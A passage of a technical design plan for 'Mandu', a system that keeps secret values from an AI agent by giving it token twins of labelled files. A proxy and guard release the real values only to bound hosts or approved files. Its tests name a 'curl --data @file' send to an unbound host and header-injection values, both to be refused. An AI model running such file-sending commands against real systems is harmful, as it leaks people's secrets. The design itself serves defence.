(§2.5 there). Confidentiality differs in the one respect that matters: the
HumanView is still the person's machine, read by programs Mandu does not
confine, so a secret value written there is a copy that must be labelled
and placed with care. What carries over, as ideas rather than as running
fs-sync in `secrets` mode (which the freeze forbids):

| fs-sync | Here |
|---|---|
| sync at the tool-call boundary, triggered by the tool_result (§2.3) | the trigger of §4.2 |
| the post-exit sweep | the end-of-session list (§4.5) |
| R2: refuse a file the person edited (§2.5) | step 2's hash check and the detach of §4.5 |
| `reconcileHumanEdits`, blame re-symbolization (§2.5a) | phase 5, a person's edit flowing into the twin |
| the two-stage commit and the shadow repository (§3) | not reused: no history is kept of the person's files; `mandu revert` stays an integrity verb |
| the path rewrite (§1.3) | not needed: there is no second tree |

Code lifted from `fs-sync/src/view-sync.ts` (the resolution walk) keeps its
provenance header, per the reuse rule.

### 4.12 Files a program writes (phase 4)

A mail-merge script the agent wrote (`python merge.py`) reads the twin of
`customers.csv` and writes `drafts/*.eml` holding tokens. No tool_use
carries the content. The guard sees each write-intent open of a regular
file by the call's process tree; it records, per call, the created or
truncated files under the workspace (bounded: 1 000 paths, the rest named
as "more"). At the call's boundary each recorded file is read through the
guard, and one that holds a token is decided as in §4.3. A file written by
a tree that opened anything raw is not a candidate: it already carries that
holder's taint (`labelWrittenPathTainted`, confidentiality.md §8) and real
bytes. The cost of the record is one append per write-intent open the guard
already traps.

## 5. Escaping on the wire

### 5.1 Today

`gateRequest` decides each token by its positions (`requestSymbolPositions`:
`url`, `authorization`, `header`, `body`) and, when every token is allowed,
splices each value as plain text into the URL, each header and the body
(`substituteTokens`; `substituteInBasic` for HTTP Basic). The gate's
decision is right; the splice ignores the syntax around the token.

### 5.2 Context-aware substitution

| Where the token sits | Encoding of the value |
|---|---|
| Body, `application/json` or `+json` (a JSON string) | parse; in each string literal, the value JSON-escaped (`"`, `\`, controls, U+2028, U+2029); a string that is exactly the token, of a value its source held as a number, boolean or `null`, written as that literal |
| Body, `application/x-www-form-urlencoded` | split on `&`, percent-decode each name and value, substitute, re-encode (`+` for space) |
| Body, `multipart/form-data` | per part, by the part's own `Content-Type`; a part with none as text |
| Body, `application/xml`, `text/xml`, `+xml` | entity-escape in text and attribute values |
| Body, `text/*` and others | as is (today's behaviour) |
| URL path segment, query name or value, userinfo | percent-encoded for that component (RFC 3986) |
| A header other than `Authorization` Basic | as is; a value holding CR, LF or NUL is refused (header injection), whatever the HTTP library would do |

**A structured body that does not parse** (declared JSON that is not JSON, a
truncated multipart) holding any token to release is refused with a reason,
without looking at the values, rather than spliced (P3, P4). A compressed
body (`Content-Encoding`) is not read, as today: a token inside it goes as a
token.

### 5.3 A token the client encoded

A client that percent-encodes a URL or form value sends the token as
`%24MDU%3Anomodel_Read%5B9bbd%5D.r12.email`, which `symbolPattern` does not
match, so the token goes out as text and the request fails at the server
(no leak). Matching the percent-decoded text of URL components and form
fields finds it; the value then goes back percent-encoded. A JSON client
that escapes `$` or `[` as `$`, `[` is covered by parsing the JSON
first. Each new match is a position like any other, decided by the gate.

### 5.4 One encoder, two callers

The rules of §5.2 and §4.4 step 6 are one module (`value-encoding`, pure),
used by net-proxy for a request and by the arbiter for a materialized file,
with parity tests between the two copies if the package boundary requires
two.

### 5.5 Risks

- **A wrong context** double-encodes (a corrupted value at the server) or
  under-encodes (today's behaviour). The parsers are the strict ones, and a
  body that does not parse is refused rather than guessed.
- **Escaping is not a release.** The gate decides on the token and the
  host before any encoding; the encoder never widens what is sent.
- **The fingerprint tripwire** scans the original surfaces (the request as
  the client sent it, confidentiality.md §4), so an encoded value at a
  bound host does not trip it, and a raw value elsewhere still does.
- **A JSON body re-serialized** loses the client's byte layout (spacing, key
  order kept, number formats). Proposal: substitute in place on the
  original text at the string literal's offsets, and re-serialize nothing.
- **Content-Length** changes with the encoding, as it does today with
  substitution.

## 6. What each piece unlocks

| Scenario | Today | Pieces needed | What still does not work |
|---|---|---|---|
| A mail merge over a labelled customer list, sent through a mail API bound to the list | one placeholder for the list | §3 (address rows), §5 (a name with a quote in a JSON body) | — |
| The same, drafts written to disk for the person to review and send | the drafts hold placeholders | §3, §4 (agent's own writes); §4.12 if the agent writes a script that writes them | conditional text on a masked column ("customers on the premium plan") unless the column is public (§3.10) |
| Filling in a form (JSON, YAML, text) from last year's labelled return | one placeholder for the return | §3, §4 | arithmetic on masked numbers (this year's total from last year's); a binary or compressed form (PDF): the filler program reads the twin and writes tokens Mandu cannot replace inside a compressed stream (§9, questions 14, 15) |
| A request whose JSON body carries a multi-line or quoted secret (a key, an address) | invalid JSON or a changed structure | §5 | — |

The model can *route* a `no-model` value, which confidentiality.md §3.2
already promises ("put the key in the config, paste the account number into
the form"); this plan supplies the file half of that promise. It does not
let the model *reason* about the value: an `any-model` file can be read
through the quarantined path or a declassified in-context read
(confidentiality.md §3.3, §4), a `local-model` file through a local model
(model-endpoints.md), and a `no-model` value by no model.

## 7. Build order

1. **Document twins** (§3): the extractor modes, naming, the identifier
   test, the limits, `twinFormOf`'s `document` form, `mandu why`, the
   policy keys `public_fields`, `row_key`, `twin`. Closes §1.2 and lets the
   model address rows. Alone, it already serves a mail merge through a
   bound API.
2. **Wire escaping** (§5): independent, small, and needed by step 1's first
   user.
3. **Write-back of the agent's own writes** (§4.1 to §4.11): the decision
   op, the guard's enactment, the note, the end-of-session list, the Inbox
   hold. Needs the guard; Linux `confined` only.
4. **Write-back of program writes** (§4.12): the guard's per-call write
   record.
5. **Open** (§9): a write-back into a person's own labelled file, a
   person's edit flowing into the twin, virtual fields for large files,
   macOS.

## 8. Tests

Every suite pins `stateAxes("secrets")` and is listed in `tests/suites.mjs`.

**Document twins (step 1).** Unit (`arbiter`): each shape's extractor
(quoted CSV fields across lines, TSV, a ragged CSV, a header row failing the
identifier test, a map keyed by e-mail, a YAML outside the subset, every
limit falling back to the whole-file twin, a walk that stays linear on an
adversarial file); naming (identifiers, sanitizing, collisions, `c<N>`,
`k<N>`, `row_key` only on a public field); one token per cell, equal values
distinct; `twinFormOf`'s `document` form; a human-labelled JSON with a
secret-named key now masking every value (the regression test for §1.2);
`public_fields` refused from any source but `policy.yaml`. Component: a
real arbiter registers a document and the value backstop's rule of §3.9.
e2e (`tests/stack/`): a labelled `customers.csv` and `return.json` read by
the agent through the production proxy wiring; the oracle asserts that no
cell value reaches the fake model in any request, that `head` of the twin
is released and `cut` is masked, and that a token sent to a bound host is
released and to another host withheld.

**Wire escaping (step 2).** Unit (`net-proxy`): per content type, a
property test that parsing the substituted body gives the value at the
token's place and the structure otherwise unchanged (values with quotes,
backslashes, line breaks, `&`, `=`, `+`, non-ASCII); a declared-JSON body
that does not parse refused, with values chosen so the refusal cannot
depend on them; a CR or LF value in a header refused; percent-encoded
tokens found and re-encoded. e2e: a multi-line labelled value in a JSON
POST reaches a fake bound service as valid JSON, and the same request to an
unbound host is refused.

**Write-back (steps 3, 4).** Unit (`arbiter`): `materializeDecision` over
every row of §4.8, and its independence of values (the same text over rows
with different values gives the same answer). Rust (`net-supervisor`,
default features): the pure parts of the enactment (the leaf checks, the
order of steps); kernel-gated (`scripts/kernel-tests.sh`): a symlink swap of
a parent between check and rename, a FIFO, a hard-linked leaf, a
descriptor held across the rename, `stat` of the path returning the twin's
metadata and mtime, opens during the lock, and a guard that cannot reach the
arbiter leaving tokens. e2e (`tests/stack/`, production two-client wiring
and the parity test for the new ops): the agent's `Write` of a file with
document tokens; the real file holds the values, the agent's next Read and a
`cat` in its world return the token text, no value reaches the fake model in
any request (the transcript re-sent included), and a `curl --data @file` to
an unbound host is withheld; each refusal of §4.8 leaves tokens and the
note; an arbiter that is down leaves tokens. Sandbox (`tests/sandbox/`,
the real launcher): the end-of-session lines, the next launch twinning the
materialized file, and phase 4's script-written drafts.

## 9. Open questions for the maintainer

1. **Default or opt-in.** Should every human-labelled data file get the
   document twin (§3.1), or only one whose entry says `twin: document`?
2. **What the shape discloses.** Headers, keys, row and column counts are
   shown (§3.5). Acceptable for a file labelled `no-model`, given that the
   structured twin already shows a config file's keys?
3. **Empty cells.** Shown empty (the model can skip a customer with no
   e-mail) or masked like any value (it cannot tell)?
4. **`public_fields` in v1**, or later?
5. **Write-back defaults** by row kind (§4.3 rule 3): `allow` for
   human-labelled data, `ask` for catalog credentials, `never` for private
   keys?
6. **Destinations.** Workspace roots and the sources' directories, with
   git-tracked files held: is holding git-tracked files too strict, or too
   weak (should a materialized file be added to `.git/info/exclude`, a
   write into the person's repository Mandu otherwise avoids)? And is the
   editor's cloud assistant reading the copies an accepted residual?
7. **Who writes the values**: the guard (fetches the rendered bytes on the
   human channel) or the arbiter (writes into a descriptor the guard passes
   it, which the NDJSON channel does not carry today)?
8. **A person's edit during the session**: detach (proposed) or
   re-symbolize into the twin (fs-sync's reconcile, phase 5)?
9. **The value backstop over document cells** (§3.9): the 12-character,
   non-dictionary floor, to be measured on a real list first?
10. **The twin-output rule** (§3.8): relax "one contiguous piece" to "only
    fields of files the tree read as twins, with the guard's evidence"?
11. **Large files**: is 10 000 cells the right bound, and are virtual fields
    worth building?
12. **Mode of an existing file** that is materialized: drop group and other
    read (proposed), or keep the person's mode?
13. **macOS**: leave write-back off (proposed) until the profile can serve a
    twin?
14. **Arithmetic** on masked numbers (a total from last year's figures): out
    of scope, the quarantined path for `any-model`, or a deterministic
    calculator on the human plane whose result is a new derived symbol?
15. **Binary forms** (PDF, XLSX): out of scope, or a listed reader that
    fills them from the materialized text form?

## 10. Relation to other documents

- confidentiality.md §3.2 (what the model may do with a `no-model` value:
  route it), §7.2 (twins), §8 (derived data).
- Plan 10 §2.4 (the structured twin this extends), §4.1 (the interposer
  that enacts write-back), §4.3 (the network exit), §11.6 (who may relax).
- Plan 13 D4 (the live derived index), §4.6 (a written file refers to its
  sources).
- Plan 15 §13.10 (why the tool_use is never resolved; the own-write record
  and notice this reuses).
- secret-discovery.md §2.5 (the recall limit §1.2 closes for documents).
- integrity/fs-sync.md (the frozen write-back, §4.11).
- Precedent outside Mandu: a template of secret references resolved into an
  output file by a command the person runs (1Password's `op inject`) is the
  same split, references for the author and values for the consumer; here
  the author is the model, and the resolution is decided by policy instead
  of by the person's command.
